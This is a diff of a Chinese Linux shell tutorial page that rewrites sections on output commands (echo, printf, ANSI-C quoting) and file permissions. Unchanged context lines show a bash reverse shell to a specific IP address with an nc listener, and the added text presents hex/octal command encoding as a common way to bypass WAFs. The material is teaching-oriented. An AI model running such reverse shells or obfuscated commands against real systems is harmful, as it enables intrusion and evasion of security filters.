@@ -267,7 +267,40 @@
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:  bash -c whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
 <p>bash -i 命令<br>以交互方式运行shell</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#    目标主机：</span></span><br><span class="line">root@kali:  bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/120.46.41.173/9023 0&gt;&amp;1&quot;</span></span><br><span class="line"><span class="comment">#    接受主机：</span></span><br><span class="line">nc -lvp 2222</span><br></pre></td></tr></table></figure>
-<h3 id="输出命令"><a href="#输出命令" class="headerlink" title="输出命令"></a>输出命令</h3><p>1.printf<br>printf 命令模仿 C 程序库（library）里的 printf() 程序,功能相近<br><code>$(printf &quot;\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&quot;)</code><br>也可以简化<br><code> $&#39;\154\163&#39;</code>ls</p>
+<h3 id="输出命令"><a href="#输出命令" class="headerlink" title="输出命令"></a>输出命令</h3><ol>
+<li>echo</li>
+</ol>
+<p>最常用的输出命令，默认输出完<strong>自动换行</strong></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hello&quot;</span>                 <span class="comment"># hello</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;hello&quot;</span>              <span class="comment"># -n：不换行</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;a\tb\nc&quot;</span>            <span class="comment"># -e 让转义生效：\t 制表、\n 换行</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\x41\x42\x43&quot;</span>       <span class="comment"># 十六进制 → ABC</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\0101\0102&quot;</span>         <span class="comment"># 八进制 → AB（echo 的八进制要写成 \0NNN）</span></span><br></pre></td></tr></table></figure>
+
+<p>写文件（<code>&gt;</code> 覆盖、<code>&gt;&gt;</code> 追加，详见「常见符号」那节）</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hi&quot;</span> &gt; a.txt            <span class="comment"># 覆盖写</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hi&quot;</span> &gt;&gt; a.txt           <span class="comment"># 追加</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;err&quot;</span> &gt;&amp;2               <span class="comment"># 输出到 stderr</span></span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>printf</li>
+</ol>
+<p>模仿 C 的 <code>printf()</code>，<strong>不会自动换行</strong>，要自己写 <code>\n</code></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span> <span class="string">&quot;hello\n&quot;</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%s-%d\n&quot;</span> <span class="string">&quot;id&quot;</span> 1      <span class="comment"># id-1</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%x\n&quot;</span> 255            <span class="comment"># ff</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;\x63\x61\x74\n&quot;</span>      <span class="comment"># cat（十六进制）</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;\154\163\n&quot;</span>          <span class="comment"># ls（八进制，这里不用加 0）</span></span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><code>$&#39;...&#39;</code>（bash 的 ANSI-C 引用）</li>
+</ol>
+<p><code>$&#39;...&#39;</code> 里的转义会先被 bash 解析，所以能直接拼出命令名，绕 WAF 很常用</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> $<span class="string">&#x27;\x63\x61\x74&#x27;</span>         <span class="comment"># cat</span></span><br><span class="line"><span class="built_in">echo</span> $<span class="string">&#x27;\154\163&#x27;</span>             <span class="comment"># ls</span></span><br><span class="line">$<span class="string">&#x27;\154\163&#x27;</span> -la              <span class="comment"># 等价于 ls -la</span></span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>输出中的命令替换</li>
+</ol>
+<p>把命令的输出当成参数用，<code>$(...)</code> 是新写法，反引号是老写法</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;当前用户: <span class="subst">$(whoami)</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;当前用户: `whoami`&quot;</span>     <span class="comment"># 老写法</span></span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>输出作为命令</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">printf</span> <span class="string">&quot;\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x68\x6f\x73\x74\x73&quot;</span>)   <span class="comment"># 拼出 cat /etc/hosts</span></span><br><span class="line">$(<span class="built_in">echo</span> -e <span class="string">&quot;\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x68\x6f\x73\x74\x73&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
 <h3 id="管理目录"><a href="#管理目录" class="headerlink" title="管理目录"></a>管理目录</h3><ol>
 <li>cd命令(change directory)<br>~ 也表示为当前用户的家目录，. 则是表示目前所在的目录， .. 则表示目前目录位置的上一层目录。<br> cd        进入用户主目录<br> cd -      返回进入此目录之前所在目录<br> cd ..     返回上一级目录<br> cd ../..  返回上两级目录<br> cd !$    把上个命令的参数作为cd 参数使用<br> cd .      当前目录</li>
 <li>ls命令(list)<br>ls 命令不仅可以查看 linux 文件夹包含的文件，而且可以查看文件权限<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ls 文件名，若文件存在，输出文件名</span><br><span class="line">ls -a     列出目录所有文件，包含以.开始的隐藏文件</span><br><span class="line">ls -r     反序排列</span><br><span class="line">ls -R     递归处理，将指定目录下的所有文件及子目录一并处理；</span><br><span class="line">ls -t     以文件修改时间排序</span><br><span class="line">ls -S     以文件大小排序</span><br><span class="line"></span><br><span class="line">ls -l(ll) 除了文件名之外，还将文件的权限、所有者、文件大小等信息详细列出来</span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -319,17 +352,24 @@
 <li>nl<br>nl可以将输出的文件内容前自动的加上行号,整体来说，nl主要是对行号做更多的修饰。</li>
 <li> rev命令<br>把每一行字符的顺序颠倒过来显示文件内容<br>若其后跟的是文件,则将文件每一行颠倒,但行的顺序不变</li>
 </ol>
-<h3 id="文件所有权和访问权限"><a href="#文件所有权和访问权限" class="headerlink" title="文件所有权和访问权限"></a>文件所有权和访问权限</h3><h4 id="查看文件所有权"><a href="#查看文件所有权" class="headerlink" title="查看文件所有权"></a>查看文件所有权</h4><p><strong>ll命令详解</strong><br>文件类型<br>常规文件(-) ：文本文件和二进制文件<br>目录文件(d) ：目录文件是文件系统中一个目录所包含的目录项所组成的文件<br>设备文件(c or b) ：每种I/O设备对应一个设备文件，存放在 /dev 目录中。<br>管道文件(p) ：主要用于在进程间传递数据 ，又称先进先出(FIFO)文件<br>链接文件(L) ：链接又可以分为软链接（符号链接）和硬链接，它提供了共享文件的一种方法。</p>
-<p>r：目录执行ls以列出目录内容；                             文件可读<br>w：目录创建、删除文件；                                   文件可写<br>x：可以cd切换进此目录，也可以使用ll查看内部文件的详细信息；  文件可执行</p>
-<p>ls -l(ll) 除了文件名之外，还将文件的权限、所有者、文件大小等信息详细列出来<br>             7  rw  5  r  3  w  x    </p>
+<h3 id="文件所有权和访问权限"><a href="#文件所有权和访问权限" class="headerlink" title="文件所有权和访问权限"></a>文件所有权和访问权限</h3><h4 id="查看文件所有权"><a href="#查看文件所有权" class="headerlink" title="查看文件所有权"></a>查看文件所有权</h4><p><strong>ll 命令详解</strong></p>
+<p><code>ll</code> 就是 <code>ls -l</code>，一行大概长这样：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rwxr-xr-x  1 root root     0 Sep 29 19:36 as</span><br></pre></td></tr></table></figure>
+
 <ul>
-<li><pre><code>rwx    rx    wx.           1          root  root      0       Sep 29 19:36          as 
-</code></pre>
-文件类型    u所有者,g组群,o其他人的权限 一级目录个数 所有者 所属的组 文件的大小 最近修改文件的最后日期 文件名<pre><code>    ----------a-------------
-</code></pre>
-</li>
+<li>第一个字符是<strong>文件类型</strong>：<code>-</code> 普通文件、<code>d</code> 目录、<code>l</code> 链接、<code>c</code>/<code>b</code> 字符/块设备、<code>p</code> 管道</li>
+<li>接着 9 位是权限，三位一组：<strong>所有者 u</strong> / <strong>所属组 g</strong> / <strong>其他人 o</strong>，每组都是 <code>rwx</code></li>
+<li>再往后依次是：硬链接数（目录是一级目录个数）、所有者、所属组、文件大小、最后修改时间、文件名</li>
 </ul>
-<p>还可以通过stat查看文件属性，stat输出更加格式化适合脚本编写使用<br><code>stat -t /etc/passwd </code>简洁输出（机器可读）<br>-c：自定义输出格式（最重要）<br><code>stat -c &quot;%U %G %a %n&quot; /etc/passwd</code><br>属主用户名 属组 权限 文件名</p>
+<p>权限位对文件和目录含义不同：</p>
+<ul>
+<li><code>r</code>：文件可读；目录可以 <code>ls</code> 看内容</li>
+<li><code>w</code>：文件可写；目录里可以创建、删除文件</li>
+<li><code>x</code>：文件可执行；目录可以 <code>cd</code> 进去</li>
+</ul>
+<p>想看更规整的属性用 <code>stat</code>，输出适合脚本处理：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stat</span> -c <span class="string">&quot;%U %G %a %n&quot;</span> /etc/passwd    <span class="comment"># 属主 属组 权限 文件名</span></span><br></pre></td></tr></table></figure>
+
 <h4 id="更改文件所有权"><a href="#更改文件所有权" class="headerlink" title="更改文件所有权"></a>更改文件所有权</h4><ol>
 <li>改变所属的用户组<br>chrgp [选项] 组名 文件名</li>
 <li>改变所有者<br>chown [选项] 用户:组 文件名</li>
